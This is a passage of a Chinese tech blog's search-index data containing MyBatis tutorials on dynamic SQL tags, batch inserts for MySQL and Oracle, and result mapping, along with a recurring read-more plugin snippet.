"hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"知识图谱"},{title:"MyBatis 入门教程之五",url:"/posts/71a2ce7f.html",text:'大纲 MyBatis 入门教程之一 MyBatis 入门教程之二 MyBatis 入门教程之三 MyBatis 入门教程之四 MyBatis 入门教程之五 MyBatis 入门教程之六 MyBatis 入门教程之七 MyBatis 入门教程之八 前言本文的所有案例代码，若没有特别说明，默认都基于以下的表结构和 JavaBean 类编写，可以直接从 GitHub 下载对应章节 mybatis-lesson-15。 12345678CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `dept_id` int(11) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8; 123456789101112131415public class Employee { private Long id; private String lastName; private String gender; private String email; private Department department; ...... @Override public String toString() { return "Employee [id=" + id + ", lastName=" + lastName + ", gender=" + gender + ", email=" + email + ", department=" + department + "]"; }} 动态 SQL 动态 SQL 是 MyBatis 强大特性之一，极大的简化拼装 SQL 的操作。 动态 SQL 标签和使用 JSTL 或其他类似基于 XML 的文本处理器相似。 MyBatis 采用功能强大的基于 OGNL 的表达式来简化操作，并提供了 if、trim (where, set)、foreach、choose (when, otherwise) 动态 SQL 标签。 if 标签12345public interface EmployeeMapper { public List&lt;Employee&gt; getEmpsByConditionIf(Employee employee);} 12345678910111213141516171819202122&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpsByConditionIf" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where &lt;if test="id != null"&gt; id = #{id} &lt;/if&gt; &lt;if test="lastName != null and lastName.trim() != \'\'"&gt; and last_name = #{lastName} &lt;/if&gt; &lt;if test="email != null and email.trim() != \'\'"&gt; and email = #{email} &lt;/if&gt; &lt;!-- OGNL 会自动对字符串与数字进行转换 --&gt; &lt;if test="gender == 1 or gender == 0"&gt; and gender = #{gender} &lt;/if&gt; &lt;/select&gt;&lt;/mapper&gt; 特别注意 上述的写法，如果传递进来的 JavaBean 参数的 id 属性刚好为 null 时，MyBatis 执行后会提示 SQL 存在语法错误（SQL 语句中有多余的 and 关键字），如下所示： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \'and last_name = \'Jim\' where 标签解决上述 if 标签带来的 SQL 拼接出错问题，一般有以下两种方法： 第一种方法：在 where 关键字后面加上 1 = 1，同时指定 if 标签里的内容都以 and 或者 or 关键字开头 123456789101112131415161718192021&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpsByConditionIf" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where 1 = 1 &lt;if test="id != null"&gt; and id = #{id} &lt;/if&gt; &lt;if test="lastName != null and lastName.trim() != \'\'"&gt; and last_name = #{lastName} &lt;/if&gt; &lt;if test="email != null and email.trim() != \'\'"&gt; and email = #{email} &lt;/if&gt; &lt;if test="gender == 1 or gender == 0"&gt; and gender = #{gender} &lt;/if&gt; &lt;/select&gt;&lt;/mapper&gt; 第二种方法：使用 where 标签替代 where 关键字 提示 where 标签用于封装查询条件，一般是和 if 标签一起使用 where 标签只会在子标签返回任何内容的情况下，才自动插入 where 关键字 使用 where 标签动态拼接 SQL 语句时，会自动将查询条件头部多出来的 and 或者 or 关键字去掉 特别注意，where 标签不会自动将查询条件尾部多出来的 and 或者 or 关键字去掉 1234567891011121314151617181920212223&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpsByConditionIf" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee &lt;!-- 利用 where 标签，将查询条件头部多出来的 and 或者 or 关键字去掉 --&gt; &lt;where&gt; &lt;if test="id != null"&gt; id = #{id} &lt;/if&gt; &lt;if test="lastName != null and lastName.trim() != \'\'"&gt; and last_name = #{lastName} &lt;/if&gt; &lt;if test="email != null and email.trim() != \'\'"&gt; and email = #{email} &lt;/if&gt; &lt;if test="gender == 1 or gender == 0"&gt; and gender = #{gender} &lt;/if&gt; &lt;/where&gt; &lt;/select&gt;&lt;/mapper&gt; trim 标签除了上述的两种方法之外，还可以使用 trim 标签，以此解决 where 标签不能自动将查询条件尾部多出来的 and 或者 or 关键字去掉的问题。trim 标签用于自定义字符串内容的截取，其标签体中的内容是 SQL 字符串拼接后的结果。trim 标签拥有以下属性： prefix：给拼接后的整个字符串加一个前缀 prefixOverrides：去掉拼接后整个字符串头部多余的字符 suffix：给拼接后的整个字符串加一个后缀 suffixOverrides：去掉拼接后整个字符串尾部多余的字符 12345public interface EmployeeMapper { public List&lt;Employee&gt; getEmpsByConditionTrim(Employee employee); } 1234567891011121314151617181920212223&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpsByConditionTrim" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee &lt;!-- 利用 trim 标签，往头部插入 where 关键字，并去掉尾部的 and 或者 or 关键字 --&gt; &lt;trim prefix="where" suffixOverrides="and | or"&gt; &lt;if test="id != null"&gt; id = #{id} and &lt;/if&gt; &lt;if test="lastName != null and lastName.trim() != \'\'"&gt; last_name = #{lastName} and &lt;/if&gt; &lt;if test="email != null and email.trim() != \'\'"&gt; email = #{email} and &lt;/if&gt; &lt;if test="gender == 1 or gender == 0"&gt; gender = #{gender} &lt;/if&gt; &lt;/trim&gt; &lt;/select&gt;&lt;/mapper&gt; choose 标签choose 标签是按顺序判断其内部 when 标签中的 test 条件是否成立。它和 if - else 不太相同，choose 标签类似于 Java 中的 switch 语句用法，只要有判断条件成立，其它判断将得不到执行，如果所有条件都不成立则会执行 otherwise 标签中的内容。 12345public interface EmployeeMapper { public List&lt;Employee&gt; getEmpsByConditionChoose(Employee employee);} 12345678910111213141516171819202122232425&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpsByConditionChoose" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee &lt;where&gt; &lt;!-- 下述的条件判断，只有一个会被执行 --&gt; &lt;choose&gt; &lt;when test="id != null"&gt; id = #{id} &lt;/when&gt; &lt;when test="lastName != null and lastName.trim() != \'\'"&gt; last_name = #{lastName} &lt;/when&gt; &lt;when test="email != null and email.trim() != \'\'"&gt; email = #{email} &lt;/when&gt; &lt;otherwise&gt; gender = 1 &lt;/otherwise&gt; &lt;/choose&gt; &lt;/where&gt; &lt;/select&gt;&lt;/mapper&gt; set 标签12345public interface EmployeeMapper { public void updateEmp(Employee employee); } 123456789101112131415161718&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;update id="updateEmp" parameterType="com.clay.mybatis.bean.Employee"&gt; update t_employee set &lt;if test="lastName != null and lastName.trim() != \'\'"&gt; last_name = #{lastName}, &lt;/if&gt; &lt;if test="email != null and email.trim() != \'\'"&gt; email = #{email}, &lt;/if&gt; &lt;if test="gender == 1 or gender == 0"&gt; gender = #{gender} &lt;/if&gt; where id = #{id} &lt;/update&gt;&lt;/mapper&gt; 特别注意 上述 SQL 更新语句的写法，如果传递进来的 JavaBean 参数的 last_name 不为 null，且 gender 属性刚好为 null 时，MyBatis 执行后会提示 SQL 存在语法错误（SQL 语句中存在多余的逗号），如下所示： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \'where id = 1\' 提示 set 标签用于 SQL 更新语句中，一般是和 if 标签一起使用 set 标签可以解析为 set 关键字，并去除 SQL 更新语句中尾部多余的逗号 为了解决上面 SQL 拼接出错的问题，可以使用 set 标签来解决： 1234567891011121314151617181920&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;update id="updateEmp" parameterType="com.clay.mybatis.bean.Employee"&gt; update t_employee &lt;!-- 利用 set 标签，去掉更新语句中尾部多余的逗号 --&gt; &lt;set&gt; &lt;if test="lastName != null and lastName.trim() != \'\'"&gt; last_name = #{lastName}, &lt;/if&gt; &lt;if test="email != null and email.trim() != \'\'"&gt; email = #{email}, &lt;/if&gt; &lt;if test="gender == 1 or gender == 0"&gt; gender = #{gender} &lt;/if&gt; &lt;/set&gt; where id = #{id} &lt;/update&gt;&lt;/mapper&gt; 或者也可以使用 trim 标签来解决问题 1234567891011121314151617181920&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;update id="updateEmp" parameterType="com.clay.mybatis.bean.Employee"&gt; update t_employee &lt;!-- 利用 trim 标签，往头部插入 set 关键字，并去掉尾部多余的逗号 --&gt; &lt;trim prefix="set" suffixOverrides=","&gt; &lt;if test="lastName != null and lastName.trim() != \'\'"&gt; last_name = #{lastName}, &lt;/if&gt; &lt;if test="email != null and email.trim() != \'\'"&gt; email = #{email}, &lt;/if&gt; &lt;if test="gender == 1 or gender == 0"&gt; gender = #{gender} &lt;/if&gt; &lt;/trim&gt; where id = #{id} &lt;/update&gt;&lt;/mapper&gt; foreach 标签属性说明foreach 标签可用于遍历集合，并拥有以下属性： 属性 必填 描述 collection 是 表示迭代集合的名称 item 是 表示本次迭代获取的元素，若 collection 为 List、Set 或者数组，则表示其中的元素；若 collection 为 Map，则代表 Map 的 value open 否 表示该语句以什么字符开始，最常用的是左括弧 ( 字符，Mybatis 会将该字符拼接到整体的 SQL 语句之前，并且只拼接一次 close 否 表示该语句以什么字符结束，最常用的是右括弧 )，MyBatis 会将该字符拼接到整体的 SQL 语句之后，并且只拼接一次 separator 否 MyBatis 会在每次迭代后给 SQL 语句拼接上 separator 属性指定的字符（例如逗号 ,） index 否 在 List、Set 和数组中，index 表示当前迭代的位置（索引），在 Map 中，index 代表的是 Map 的 key 在使用 foreach 标签的时候，最关键也是最容易出错的就是 collection 属性，该属性是必须指定的，但是在不同情况下，该属性的值是不一样的，主要有以下 3 种情况： 如果传入的是单参数且参数类型是一个 List 的时候，collection 的属性值默认是 list 如果传入的是单参数且参数类型是一个数组的时候，collection 的属性值默认是 array 如果传入的参数有多个的时候，就需要把它们封装成一个 Map 了，当然单参数也可以封装成 Map。实际上在传入参数的时候，MyBatis 的底层代码也是会自动把参数封装成一个 Map 的，Map 的 key 就是参数名，所以这个时候 collection 属性值就是传入的 List 或 Array 对象在自己封装的 Map 里面的 key 提示 在 MyBatis 中，使用 List 传递参数的详细教程可看这里。 数据批量查询案例12345public interface EmployeeMapper { public List&lt;Employee&gt; getEmpsByConditionByForeach(List&lt;Long&gt; ids);} 123456789101112&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpsByConditionByForeach" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id in &lt;foreach collection="list" item="id" open="(" separator="," close=")"&gt; #{id} &lt;/foreach&gt; &lt;/select&gt;&lt;/mapper&gt; 或者使用 @Param 注解指定参数名称： 12345public interface EmployeeMapper { public List&lt;Employee&gt; getEmpsByConditionByForeach(@Param("ids") List&lt;Long&gt; ids);} 123456789101112&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpsByConditionByForeach" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id in &lt;foreach collection="ids" item="id" open="(" separator="," close=")"&gt; #{id} &lt;/foreach&gt; &lt;/select&gt; &lt;/mapper&gt; MySQL 数据库数据批量插入案例一12345public interface EmployeeMapper { public void addEmps(@Param("emps") List&lt;Employee&gt; emps); } 123456789101112&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- MySQL 第一种数据批量插入方式 --&gt; &lt;insert id="addEmps"&gt; insert into t_employee(last_name, gender, email) values &lt;foreach collection="emps" item="emp" separator=","&gt; (#{emp.lastName}, #{emp.gender}, #{emp.email}) &lt;/foreach&gt; &lt;/insert&gt;&lt;/mapper&gt; 数据批量插入案例二12345public interface EmployeeMapper { public void addEmps(@Param("emps") List&lt;Employee&gt; emps); } 1234567891011&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- MySQL 第二种数据批量插入方式 --&gt; &lt;insert id="addEmps"&gt; &lt;foreach collection="emps" item="emp"&gt; insert into t_employee(last_name, gender, email) values(#{emp.lastName}, #{emp.gender}, #{emp.email}); &lt;/foreach&gt; &lt;/insert&gt;&lt;/mapper&gt; 特别注意 默认情况下 MyBatis 不允许多条语句同时执行，因此需要在连接 MySQL 的 url 中增加 allowMultiQueries=true 配置内容，否则上述 SQL 执行时会出错。 如果批量插入大量的数据，上述的批量插入方式可能会执行失败，这是由于 MySQL 对 SQL 语句的长度有限制导致的。 Oracle 数据库Oracle 不支持使用 insert ... values(),()... 的方式批量插入数据，但支持使用 begin ... end; 或者中间表的方式来实现数据的批量插入。 数据批量插入案例一12345public interface EmployeeMapper { public void addEmps(@Param("emps") List&lt;Employee&gt; emps); } 1234567891011&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- Oracle 第一种数据批量插入方式 --&gt; &lt;insert id="addEmps" databaseId="oracle"&gt; &lt;foreach collection="emps" item="emp" open="begin" close="end;"&gt; insert into t_employee(id, last_name, gender, email) values(employees_seq.nextval, #{emp.lastName}, #{emp.gender}, #{emp.email}); &lt;/foreach&gt; &lt;/insert&gt;&lt;/mapper&gt; 最终会发出类似下面的 SQL 语句到 Oracle 数据库： 12345begin insert into t_employee(id, last_name, gender, email) values (1, \'Jim\', \'1\', \'jim@gmail.com\'); insert into t_employee(id, last_name, gender, email) values (2, \'Tom\', \'1\', \'tom@gmail.com\'); insert into t_employee(id, last_name, gender, email) values (3, \'Peter\', \'1\', \'peter@gmail.com\');end; 数据批量插入案例二12345public interface EmployeeMapper { public void addEmps(@Param("emps") List&lt;Employee&gt; emps); } 1234567891011&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- Oracle 第二种数据批量插入方式 --&gt; &lt;insert id="addEmps" databaseId="oracle"&gt; insert into t_employee(id, last_name, gender, email) &lt;foreach collection="emps" item="emp" separator="union" open="select employees_seq.nextval, lastName, gender, email from (" close=")"&gt; select #{emp.lastName} lastName, #{emp.gender} gender, #{emp.email} email from dual &lt;/foreach&gt; &lt;/insert&gt;&lt;/mapper&gt; 最终会发出类似下面的 SQL 语句到 Oracle 数据库： 12345678insert into t_employee(id, last_name, gender, email)select employees_seq.nextval, lastName, gender, email from ( select \'Jim\' lastName, \'1\' gender, \'jim@gmail.com\' email from dual union select \'Tom\' lastName, \'1\' gender, \'tom@gmail.com\' email from dual union select \'Peter\' lastName, \'1\' gender, \'peter@gmail.com\' email from dual) script 标签若要在带注解的 DAO 接口中使用动态 SQL 语句，则可以使用 script 标签来实现，例如： 1234567891011@Update({"&lt;script&gt;", "update Author", " &lt;set&gt;", " &lt;if test=\'username != null\'&gt;username=#{username},&lt;/if&gt;", " &lt;if test=\'password != null\'&gt;password=#{password},&lt;/if&gt;", " &lt;if test=\'email != null\'&gt;email=#{email},&lt;/if&gt;", " &lt;if test=\'bio != null\'&gt;bio=#{bio}&lt;/if&gt;", " &lt;/set&gt;", "where id=#{id}", "&lt;/script&gt;"})public void updateAuthorValues(Author author); 多数据库支持若在 MyBatis 的全局配置文件中配置了 databaseIdProvider 标签（数据库厂商标识），那么可以在动态 SQL 中使用名为 _databaseId 的变量（MyBatis 内置参数）来为不同的数据库构建特定的语句。_databaseId 内置参数的详细使用教程，可以查看这里。 123456789&lt;configuration&gt; &lt;!-- 数据库厂商标识 --&gt; &lt;databaseIdProvider type="DB_VENDOR"&gt; &lt;property name="SQL Server" value="sqlserver" /&gt; &lt;property name="DB2" value="db2" /&gt; &lt;property name="MySQL" value="mysql" /&gt; &lt;property name="Oracle" value="oracle" /&gt; &lt;/databaseIdProvider&gt;&lt;/configuration&gt; 1234567891011&lt;insert id="insert"&gt; &lt;selectKey keyProperty="id" resultType="int" order="BEFORE"&gt; &lt;if test="_databaseId == \'oracle\'"&gt; select seq_users.nextval from dual &lt;/if&gt; &lt;if test="_databaseId == \'db2\'"&gt; select nextval for seq_users from sysibm.sysdummy1" &lt;/if&gt; &lt;/selectKey&gt; insert into users values (#{id}, #{name})&lt;/insert&gt; 插入脚本语言MyBatis 从 3.2 版本开始支持插入脚本语言，这允许开发者插入一种语言驱动，并基于这种语言来编写动态 SQL 查询语句。 通过实现以下接口来插入一种脚本语言 1234567public interface LanguageDriver { ParameterHandler createParameterHandler(MappedStatement mappedStatement, Object parameterObject, BoundSql boundSql); SqlSource createSqlSource(Configuration configuration, XNode script, Class&lt;?&gt; parameterType); SqlSource createSqlSource(Configuration configuration, String script, Class&lt;?&gt; parameterType);} 实现自定义语言驱动后，就可以在 mybatis-config.xml 文件中将它设置为默认语言 123456&lt;typeAliases&gt; &lt;typeAlias type="org.sample.MyLanguageDriver" alias="myLanguage"/&gt;&lt;/typeAliases&gt;&lt;settings&gt; &lt;setting name="defaultScriptingLanguage" value="myLanguage"/&gt;&lt;/settings&gt; 或者使用 lang 属性为特定的 SQL 语句指定语言 123&lt;select id="selectBlog" lang="myLanguage"&gt; SELECT * FROM BLOG&lt;/select&gt; 或者在 Mapper 接口上添加 @Lang 注解 1234567public interface Mapper { @Lang(MyLanguageDriver.class) @Select("SELECT * FROM BLOG") List&lt;Blog&gt; selectBlog();} 提示 MyBatis 支持使用 Apache Velocity 作为动态语言，更多细节请参考 MyBatis-Velocity 项目。 前面介绍的所有 xml 标签都由默认 MyBatis 语言提供，而它由语言驱动 org.apache.ibatis.scripting.xmltags.XmlLanguageDriver（别名为 xml）所提供。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"前端面试题之一",url:"/posts/66192ea1.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"MyBatis 入门教程之四",url:"/posts/6c40ac3a.html",text:'大纲 MyBatis 入门教程之一 MyBatis 入门教程之二 MyBatis 入门教程之三 MyBatis 入门教程之四 MyBatis 入门教程之五 MyBatis 入门教程之六 MyBatis 入门教程之七 MyBatis 入门教程之八 SQL 映射文件select 标签本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-7。 属性说明select 标签用于定义查询操作，拥有以下常用属性： id：唯一标识符，用来引用这条语句，需要与接口的方法名一致。 parameterType：参数类型，可以不传递，MyBatis 会根据 TypeHandler 自动推断参数类型。 resultType：返回值类型，可以是类型别名或者全限定类名。如果返回结果是集合，则其值是集合中元素的类型。resultType 不能和 resultMap 同时使用。 提示 select 标签还拥有很多其他属性，详细说明请点击这里查看。 使用案例返回 List 类型12345public interface EmployeeMapper { public List&lt;Employee&gt; getAllEmp();} 123&lt;select id="getAllEmp" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee&lt;/select&gt; 1查询结果：[1_Tom_1_tom@gmail.com, 2_Jim_1_jim@gmail.com] 返回 Map 类型（第一种场景）123456public interface EmployeeMapper { public Map&lt;String, Object&gt; getEmpById(Long id);} 12345&lt;select id="getEmpById" parameterType="Long" resultType="Map"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id}&lt;/select&gt; 1查询结果：{lastName=Tom, gender=1, id=1, email=tom@gmail.com} 返回 Map 类型（第二种场景）123456789101112public interface EmployeeMapper { /** * 使用注解告诉 MyBatis，返回的 Map 使用哪个 JavaBean 属性作为 key * * @param lastName * @return */ @MapKey("id") public Map&lt;String, Employee&gt; getEmpByLastName(String lastName);} 12345&lt;select id="getEmpByLastName" parameterType="String" resultType="Map"&gt; select id, last_name as lastName, gender, email from t_employee where last_name like #{lastName}&lt;/select&gt; 1查询结果：{1={lastName=Tom, gender=1, id=1, email=tom@gmail.com}, 2={lastName=Jim, gender=1, id=2, email=jim@gmail.com}} 结果映射全局 setting 设置配置说明– autoMappingBehavior 可以开启自动映射的功能，默认值是 PARTIAL，唯一的要求是字段名和 JavaBean 属性名需要一致。– 如果将 autoMappingBehavior 设置为 null，则 MyBatis 会取消自动映射。– 另外还可以使用数据库字段命名规范，即 JavaBean 的属性名符合驼峰命名法，如 last_name 映射为 lastName，简单设置 mapUnderscoreToCamelCase = true 就可以开启自动驼峰命名规则映射功能。 使用案例123456&lt;configuration&gt; &lt;settings&gt; &lt;!-- 开启驼峰命名自动映射 --&gt; &lt;setting name="mapUnderscoreToCamelCase" value="true" /&gt; &lt;/settings&gt;&lt;/configuration&gt; resultMap 的使用高级结果映射 复杂的查询语句 123456789101112131415161718192021222324252627282930313233&lt;select id="selectBlogDetails" resultMap="detailedBlogResultMap"&gt; select B.id as blog_id, B.title as blog_title, B.author_id as blog_author_id, A.id as author_id, A.username as author_username, A.password as author_password, A.email as author_email, A.bio as author_bio, A.favourite_section as author_favourite_section, P.id as post_id, P.blog_id as post_blog_id, P.author_id as post_author_id, P.created_on as post_created_on, P.section as post_section, P.subject as post_subject, P.draft as draft, P.body as post_body, C.id as comment_id, C.post_id as comment_post_id, C.name as comment_name, C.comment as comment_text, T.id as tag_id, T.name as tag_name from Blog B left outer join Author A on B.author_id = A.id left outer join Post P on B.id = P.blog_id left outer join Comment C on P.id = C.post_id left outer join Post_Tag PT on PT.post_id = P.id left outer join Tag T on PT.tag_id = T.id where B.id = #{id}&lt;/select&gt; 复杂的结果映射 12345678910111213141516171819202122232425262728&lt;resultMap id="detailedBlogResultMap" type="Blog"&gt; &lt;constructor&gt; &lt;idArg column="blog_id" javaType="int" /&gt; &lt;/constructor&gt; &lt;result property="title" column="blog_title" /&gt; &lt;association property="author" javaType="Author"&gt; &lt;id property="id" column="author_id" /&gt; &lt;result property="username" column="author_username" /&gt; &lt;result property="password" column="author_password" /&gt; &lt;result property="email" column="author_email" /&gt; &lt;result property="bio" column="author_bio" /&gt; &lt;result property="favouriteSection" column="author_favourite_section" /&gt; &lt;/association&gt; &lt;collection property="posts" ofType="Post"&gt; &lt;id property="id" column="post_id" /&gt; &lt;result property="subject" column="post_subject" /&gt; &lt;association property="author" javaType="Author" /&gt; &lt;collection property="comments" ofType="Comment"&gt; &lt;id property="id" column="comment_id" /&gt; &lt;/collection&gt; &lt;collection property="tags" ofType="Tag"&gt; &lt;id property="id" column="tag_id" /&gt; &lt;/collection&gt; &lt;discriminator javaType="int" column="draft"&gt; &lt;case value="1" resultType="DraftPost" /&gt; &lt;/discriminator&gt; &lt;/collection&gt;&lt;/resultMap&gt; 属性说明通过自定义的 resultMap，可以实现高级结果映射功能。resultMap 标签的属性列表如下： 属性 描述 id 当前命名空间中的一个唯一标识，用于标识一个结果映射。 type 类的完全限定名，或者一个类型别名。 autoMapping 如果设置这个属性，MyBatis 将会为本结果映射开启或者关闭自动映射。这个属性会覆盖全局的属性 autoMappingBehavior，默认值是 未设置（unset）。 resultMap 标签的子标签说明如下： constructor - 类在实例化时，用来注入结果到构造方法中 – idArg - ID 参数；标记结果作为 ID 可以帮助提高整体效能 – arg - 注入到构造方法的一个普通结果 id – 一个 ID 结果；标记结果作为 ID 可以帮助提高整体效能 result – 注入到字段或 JavaBean 属性的普通结果 association - 一个复杂类型的关联，许多结果将包装成这种类型 嵌套结果映射 – 关联可以是 resultMap 元素，或是对其它结果映射的引用 collection - 一个复杂类型的集合 嵌套结果映射 – 集合可以是 resultMap 元素，或是对其它结果映射的引用 discriminator - 使用结果值来决定使用哪个 resultMap case - 基于某些值的结果映射 嵌套结果映射 – case 也是一个结果映射，因此具有相同的结构和元素；或者引用其它的结果映射 resultMap 标签的 id 和 result 子标签都可以将一个列的值映射到一个简单数据类型（String、int、double、Date 等）的属性或字段。这两者之间的唯一区别是，id 子标签对应的属性会被标记为对象的标识符，在比较对象实例时使用。这样可以提高整体的性能，尤其是进行缓存和嵌套结果映射（也就是级联映射）的时候。这两个子标签都有一些属性： 属性 描述 property 映射到列结果的字段或属性。如果 JavaBean 有这个名字的属性（property），会先使用该属性。否则 MyBatis 将会寻找给定名称的字段（field）。 无论是哪一种情形，你都可以使用常见的点式分隔形式进行复杂属性导航。比如，你可以这样映射一些简单的东西：“username”，或者映射到一些复杂的东西上：“address.street.number”。 column 数据库中的列名，或者是列的别名。一般情况下，这和传递给 resultSet.getString(columnName) 方法的参数一样。 javaType 一个 Java 类的全限定名，或一个类型别名。如果你映射到一个 JavaBean，那么 MyBatis 通常可以自动推断类型。然而，如果你映射到的是 HashMap，那么你应该明确地指定 javaType 来保证行为与期望的相一致。 jdbcType JDBC 类型，所支持的 JDBC 类型参见这个表格之后的” 支持的 JDBC 类型”。只需要在可能执行插入、更新和删除的且允许空值的列上指定 JDBC 类型。这是 JDBC 的要求而非 MyBatis 的要求。如果你直接面向 JDBC 编程，你需要对可以为空值的列指定这个类型。 typeHandler 使用这个属性，你可以覆盖默认的类型处理器。这个属性值是一个类型处理器实现类的全限定名，或者是类型别名。 MyBatis 通过内置的 jdbcType 枚举类型支持以下的 JDBC 类型： 自动映射在简单的场景下，MyBatis 可以自动映射查询结果，但如果遇到复杂的场景，则需要构建一个结果映射，而且这两种策略支持混合使用。当自动映射查询结果时，MyBatis 会获取结果中返回的列名，并在 Java 类中查找相同名字的属性（忽略大小写）。这意味着如果发现了 ID 列和 id 属性，MyBatis 会将列 ID 的值赋给 id 属性。通常数据库列使用大写字母组成的单词命名，单词间用下划线分隔，而 Java 属性一般遵循驼峰命名法约定；为了在这两种命名方式之间启用自动映射，需要在全局的配置文件中将 mapUnderscoreToCamelCase 设置为 true。MyBatis 甚至在提供了结果映射后，自动映射也能工作。在这种情况下，对于每一个结果映射，在 ResultSet 出现的列，如果没有设置手动映射，将被自动映射；在自动映射处理完毕后，再处理手动映射。本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-８。 自动映射等级MyBatis 提供了三种自动映射等级： FULL - 自动映射所有属性 NONE - 禁用自动映射，仅对手动映射的属性进行映射 PARTIAL - 对除在内部定义了嵌套结果映射（也就是关联的属性）以外的属性进行映射 默认的自动映射等级是 PARTIAL，这是有原因的。当对级联查询的结果使用 FULL 时，级联查询会在同一行中获取多个不同实体的数据，因此可能导致非预期的映射。无论设置的自动映射等级是哪种，MyBatis 都支持在结果映射上设置 autoMapping 属性来为指定的结果映射设置启用或禁用自动映射，如下所示： 123&lt;resultMap id="userResultMap" type="User" autoMapping="false"&gt; &lt;result property="password" column="hashed_password"/&gt;&lt;/resultMap&gt; 使用案例之一123&lt;resultMap id="userResultMap" type="User"&gt; &lt;result property="password" column="hashed_password"/&gt;&lt;/resultMap&gt; 12345678&lt;select id="selectUsers" resultMap="userResultMap"&gt; select user_id as "id", user_name as "userName", hashed_password from some_table where id = #{id}&lt;/select&gt; 在上面的例子中，id 和 userName 列将被自动映射，hashed_password 列将根据配置进行映射。 使用案例之二123456public interface EmployeeMapper { public Employee getById(Long id);} 123456789101112131415161718&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;resultMap type="com.clay.mybatis.bean.Employee" id="employeeResultMap"&gt; &lt;!-- id：定义主键列的封装规则； column：指定列名； property：指定对应的JavaBean属性； --&gt; &lt;id column="id" property="id" /&gt; &lt;!-- 定义普通列的封装规则，即使不指定普通列 MyBatis 也会按照默认的规则自动封装，但一般都全部写上 --&gt; &lt;result column="last_name" property="lastName" /&gt; &lt;result column="gender" property="gender" /&gt; &lt;result column="email" property="email" /&gt; &lt;/resultMap&gt; &lt;select id="getById" resultMap="employeeResultMap"&gt; select id, last_name, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; 级联映射本节所有的案例代码，都基于以下的表结构和 JavaBean 类编写。 数据库表结构 1234567891011121314CREATE TABLE `t_department` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(255) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `dept_id` int(11) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT 